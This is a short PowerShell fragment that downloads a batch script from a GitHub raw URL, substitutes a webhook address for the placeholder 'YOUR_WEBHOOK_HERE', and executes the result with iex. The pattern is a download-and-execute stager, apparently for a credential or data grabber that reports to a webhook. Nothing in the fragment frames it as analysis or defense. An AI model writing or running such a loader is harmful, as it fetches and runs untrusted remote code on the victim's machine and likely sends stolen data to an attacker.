$powershell_url = "https://raw.githubusercontent.com/iKingOfKings/Hii/main/SrcSahmm.bat"

#replace YOUR_WEBHOOK_HERE with $webhook
$content = (iwr -Uri $powershell_url -UseBasicParsing) -replace "YOUR_WEBHOOK_HERE", "$webhook"

iex $content